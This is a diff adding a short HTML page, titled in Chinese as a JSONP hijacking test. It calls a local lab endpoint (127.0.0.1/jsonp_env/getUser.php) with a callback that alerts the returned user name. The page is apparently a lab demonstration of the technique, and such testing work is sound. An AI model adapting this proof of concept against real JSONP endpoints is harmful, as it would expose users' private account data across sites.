@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>JSONP劫持测试</title>
+</head>
+<body>
+<script type="text/javascript">
+function callbackFunction(result)
+        {
+            alert(result.name);
+        }
+</script>
+<script type="text/javascript" src="http://127.0.0.1/jsonp_env/getUser.php?jsoncallback=callbackFunction"></script>
+</body>
+</html>
